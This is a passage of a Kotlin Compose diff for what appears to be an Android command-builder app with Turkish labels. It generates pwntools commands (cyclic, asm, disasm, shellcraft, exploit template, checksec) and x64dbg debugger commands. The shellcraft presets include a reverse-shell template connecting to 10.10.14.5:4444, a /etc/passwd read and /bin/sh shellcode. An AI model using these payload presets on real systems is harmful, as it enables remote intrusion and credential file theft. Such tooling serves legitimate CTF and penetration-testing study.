+                OutlinedTextField(value = cyclicLength, onValueChange = { cyclicLength = it }, label = { Text("Kalıp Uzunluğu (Byte Cinsinden: örn. 200, 500)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+            } else {
+                OutlinedTextField(value = cyclicLookup, onValueChange = { cyclicLookup = it }, label = { Text("Çökme Değeri (Hex 0x6161616c veya laaa)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+            }
+            Spacer(modifier = Modifier.height(8.dp))
+            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+                listOf("4" to "32-bit Mimari (-n 4)", "8" to "64-bit Mimari (-n 8)").forEach { (w, lbl) ->
+                    val sel = cyclicWidth == w
+                    Box(
+                        modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { cyclicWidth = w }.padding(vertical = 5.dp),
+                        contentAlignment = Alignment.Center
+                    ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+                }
+            }
+
+            val parts = mutableListOf("pwn", "cyclic")
+            if (cyclicMode == "generate") {
+                parts.add(cyclicLength.trim())
+            } else {
+                parts.addAll(listOf("-l", cyclicLookup.trim()))
+            }
+            if (cyclicWidth != "4") parts.addAll(listOf("-n", cyclicWidth))
+            GeneratedCommandCard(command = parts.joinToString(" "), language = language)
+
+        } else if (subcommand == "asm") {
+            OutlinedTextField(value = asmCode, onValueChange = { asmCode = it }, label = { Text("Assembly Talimatı (Örn: xor rax, rax; push rax)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+            Spacer(modifier = Modifier.height(8.dp))
+            Text(text = "HEDEF MİMARİ (-c)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+            Spacer(modifier = Modifier.height(4.dp))
+            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+                listOf("amd64" to "x86_64 (amd64)", "i386" to "x86 (i386)", "arm" to "ARM 32", "aarch64" to "ARM 64").forEach { (a, lbl) ->
+                    val sel = arch == a
+                    Box(
+                        modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { arch = a }.padding(vertical = 5.dp),
+                        contentAlignment = Alignment.Center
+                    ) { Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+                }
+            }
+            Spacer(modifier = Modifier.height(8.dp))
+            Text(text = "ÇIKTI FORMATI (-f)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+            Spacer(modifier = Modifier.height(4.dp))
+            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+                listOf("hex" to "Hex", "raw" to "Raw Bayt", "string" to "Python String", "elf" to "ELF Dosyası").forEach { (fmt, lbl) ->
+                    val sel = asmFormat == fmt
+                    Box(
+                        modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { asmFormat = fmt }.padding(vertical = 5.dp),
+                        contentAlignment = Alignment.Center
+                    ) { Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+                }
+            }
+
+            val parts = mutableListOf("pwn", "asm", "\"${asmCode.trim()}\"", "-c", arch, "-f", asmFormat)
+            GeneratedCommandCard(command = parts.joinToString(" "), language = language)
+
+        } else if (subcommand == "disasm") {
+            OutlinedTextField(value = disasmHex, onValueChange = { disasmHex = it }, label = { Text("Disassemble Edilecek Hex Dizisi") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+            Spacer(modifier = Modifier.height(8.dp))
+            Text(text = "HEDEF MİMARİ (-c)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+            Spacer(modifier = Modifier.height(4.dp))
+            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+                listOf("amd64" to "amd64", "i386" to "i386", "arm" to "ARM").forEach { (a, lbl) ->
+                    val sel = arch == a
+                    Box(
+                        modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { arch = a }.padding(vertical = 5.dp),
+                        contentAlignment = Alignment.Center
+                    ) { Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+                }
+            }
+
+            val parts = mutableListOf("pwn", "disasm", disasmHex.trim(), "-c", arch)
+            GeneratedCommandCard(command = parts.joinToString(" "), language = language)
+
+        } else if (subcommand == "shellcraft") {
+            Text(text = "HAZIR SHELLCRAFT ŞABLONLARI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+            Spacer(modifier = Modifier.height(4.dp))
+            Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+                listOf(
+                    "amd64.linux.sh" to "amd64 Linux /bin/sh",
+                    "i386.linux.sh" to "i386 Linux /bin/sh",
+                    "amd64.linux.connect 10.10.14.5 4444" to "Reverse Shell",
+                    "amd64.linux.cat \"/etc/passwd\"" to "Cat /etc/passwd",
+                    "amd64.linux.findpeersh" to "Find Peer Shell"
+                ).forEach { (tmpl, lbl) ->
+                    val sel = shellcraftTemplate == tmpl
+                    Box(
+                        modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { shellcraftTemplate = tmpl }.padding(horizontal = 8.dp, vertical = 5.dp)
+                    ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+                }
+            }
+            Spacer(modifier = Modifier.height(6.dp))
+            OutlinedTextField(value = shellcraftTemplate, onValueChange = { shellcraftTemplate = it }, label = { Text("Shellcraft İfadesi") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+            Spacer(modifier = Modifier.height(8.dp))
+            Text(text = "ÇIKTI FORMATI (-f)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+            Spacer(modifier = Modifier.height(4.dp))
+            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+                listOf("hex" to "Hex", "raw" to "Raw", "c" to "C Array", "elf" to "ELF Binary").forEach { (fmt, lbl) ->
+                    val sel = shellcraftFormat == fmt
+                    Box(
+                        modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { shellcraftFormat = fmt }.padding(vertical = 5.dp),
+                        contentAlignment = Alignment.Center
+                    ) { Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+                }
+            }
+
+            val parts = mutableListOf("pwn", "shellcraft", shellcraftTemplate.trim(), "-f", shellcraftFormat)
+            GeneratedCommandCard(command = parts.joinToString(" "), language = language)
+
+        } else if (subcommand == "template") {
+            OutlinedTextField(value = templateBinary, onValueChange = { templateBinary = it }, label = { Text("Hedef İkili Dosya (Binary)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+            Spacer(modifier = Modifier.height(8.dp))
+            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+                OutlinedTextField(value = templateHost, onValueChange = { templateHost = it }, label = { Text("Uzak Sunucu (--host)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+                OutlinedTextField(value = templatePort, onValueChange = { templatePort = it }, label = { Text("Uzak Port (--port)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+            }
+            Spacer(modifier = Modifier.height(6.dp))
+            ToggleOption(label = "--quiet Başlık Yorumlarını Azalt", checked = templateQuiet, onCheckedChange = { templateQuiet = it })
+
+            val parts = mutableListOf("pwn", "template", templateBinary.trim(), "--host", templateHost.trim(), "--port", templatePort.trim())
+            if (templateQuiet) parts.add("--quiet")
+            parts.add("> exploit.py")
+            GeneratedCommandCard(command = parts.joinToString(" "), language = language)
+
+        } else {
+            // checksec
+            OutlinedTextField(value = checksecBinary, onValueChange = { checksecBinary = it }, label = { Text("Hedef İkili Dosya Yolu") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+            val parts = mutableListOf("pwn", "checksec", checksecBinary.trim())
+            GeneratedCommandCard(command = parts.joinToString(" "), language = language)
+        }
+    }
+}
+
+// 74. X64DBG & X32DBG WINDOWS DEBUGGER
+@Composable
+fun X64dbgBuilder(language: AppLanguage) {
+    var mode by remember { mutableStateOf("x64") }
+    var targetPath by remember { mutableStateOf("C:\\Targets\\suspicious_sample.exe") }
+    var targetArgs by remember { mutableStateOf("") }
+    var attachPid by remember { mutableStateOf("") }
+    var initScript by remember { mutableStateOf("") }
+    var workingDir by remember { mutableStateOf("") }
+    var jit by remember { mutableStateOf(false) }
+
+    // CLI commands
+    var cmdType by remember { mutableStateOf("bp") }
+    var cmdAddress by remember { mutableStateOf("0x00401000") }
+    var cmdParam by remember { mutableStateOf("eax=0") }
+
+    Column {
+        Text(text = "HATA AYIKLAYICI ÇALIŞMA MODU", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+        Spacer(modifier = Modifier.height(4.dp))
+        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+            listOf("x64" to "x64dbg (64-bit)", "x32" to "x32dbg (32-bit)", "x96" to "x96dbg Başlatıcı", "cli" to "Konsol Komutları").forEach { (m, lbl) ->
+                val sel = mode == m
+                Box(
+                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { mode = m }.padding(vertical = 6.dp),
+                    contentAlignment = Alignment.Center
+                ) { Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+            }
+        }
+
+        Spacer(modifier = Modifier.height(10.dp))
+        if (mode != "cli") {
+            val exeName = when (mode) {
+                "x64" -> "x64dbg.exe"
+                "x32" -> "x32dbg.exe"
+                else -> "x96dbg.exe"
+            }
+            OutlinedTextField(value = targetPath, onValueChange = { targetPath = it }, label = { Text("Hedef Windows Program Yolu (.exe)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+            Spacer(modifier = Modifier.height(8.dp))
+            OutlinedTextField(value = targetArgs, onValueChange = { targetArgs = it }, label = { Text("Programa Aktarılacak Argümanlar (-a \"arg1 arg2\")") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+            Spacer(modifier = Modifier.height(8.dp))
+            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+                OutlinedTextField(value = attachPid, onValueChange = { attachPid = it }, label = { Text("Çalışan Sürece Bağlan (-p PID)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+                OutlinedTextField(value = workingDir, onValueChange = { workingDir = it }, label = { Text("Çalışma Dizini (-cwd)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+            }
+            Spacer(modifier = Modifier.height(8.dp))
+            OutlinedTextField(value = initScript, onValueChange = { initScript = it }, label = { Text("Açılışta Koşulacak Script (-script \"C:\\init.txt\")") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+            Spacer(modifier = Modifier.height(6.dp))
+            ToggleOption(label = "-jit Varsayılan JIT (Just-In-Time) Hata Ayıklayıcısı Yap", checked = jit, onCheckedChange = { jit = it })
+
+            val parts = mutableListOf(exeName)
+            if (jit) parts.add("-jit")
+            if (attachPid.isNotBlank()) parts.addAll(listOf("-p", attachPid.trim()))
+            if (targetPath.isNotBlank() && attachPid.isBlank()) parts.add("\"${targetPath.trim()}\"")
+            if (targetArgs.isNotBlank()) parts.addAll(listOf("-a", "\"${targetArgs.trim()}\""))
+            if (workingDir.isNotBlank()) parts.addAll(listOf("-cwd", "\"${workingDir.trim()}\""))
+            if (initScript.isNotBlank()) parts.addAll(listOf("-script", "\"${initScript.trim()}\""))
+
+            GeneratedCommandCard(command = parts.joinToString(" "), language = language)
+
+        } else {
+            // CLI commands reference
+            Text(text = "x64dbg KONSOL KOMUT KATEGORİSİ", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
+            Spacer(modifier = Modifier.height(4.dp))
+            Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+                listOf(
+                    "bp" to "Software BP (bp)",
+                    "bph" to "Hardware BP (bph)",
+                    "bpm" to "Memory BP (bpm)",
+                    "r" to "Yazmaç Değiştir (r)",
+                    "find" to "Bellekte Ara (find)",
+                    "assemble" to "Talimat Yama (asm)"
+                ).forEach { (ct, lbl) ->
+                    val sel = cmdType == ct
+                    Box(
+                        modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable {
+                            cmdType = ct
+                            if (ct == "r") cmdParam = "eax=0"
+                            else if (ct == "find") cmdParam = "\"8B ?? 89\""
+                            else if (ct == "assemble") cmdParam = "nop"
+                        }.padding(horizontal = 8.dp, vertical = 5.dp)
+                    ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary) }
+                }
+            }
+            Spacer(modifier = Modifier.height(8.dp))
+            OutlinedTextField(value = cmdAddress, onValueChange = { cmdAddress = it }, label = { Text("Hedef Adres / API Sembolü (Örn: 0x00401000 veya VirtualAlloc)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
+            Spacer(modifier = Modifier.height(8.dp))
+            OutlinedTextField(
+                value = cmdParam,
+                onValueChange = { cmdParam = it },
+                label = { Text(if (cmdType == "find") "Aranacak Desen / String" else if (cmdType == "assemble") "Yeni Assembly Komutu" else "Parametre / Değer") },
+                modifier = Modifier.fillMaxWidth(),
+                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
+                singleLine = true
+            )
+
+            val generatedCmd = when (cmdType) {
+                "bp" -> "bp $cmdAddress"
+                "bph" -> "bph $cmdAddress, x, 1"
+                "bpm" -> "bpm $cmdAddress, r"
+                "r" -> "r $cmdParam"
+                "find" -> "find $cmdAddress, $cmdParam"
+                "assemble" -> "asm $cmdAddress, \"$cmdParam\""
+                else -> "bp $cmdAddress"
+            }
+            GeneratedCommandCard(command = generatedCmd, language = language)
+        }
     }
 }
 
